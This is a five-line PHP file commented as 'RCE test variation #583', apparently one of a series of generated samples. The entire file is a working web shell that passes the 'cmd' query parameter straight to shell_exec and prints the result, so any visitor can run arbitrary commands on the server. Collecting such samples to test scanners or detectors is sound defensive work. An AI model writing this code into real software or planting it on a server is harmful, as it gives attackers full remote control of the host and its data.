<?php
// RCE test variation #583
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>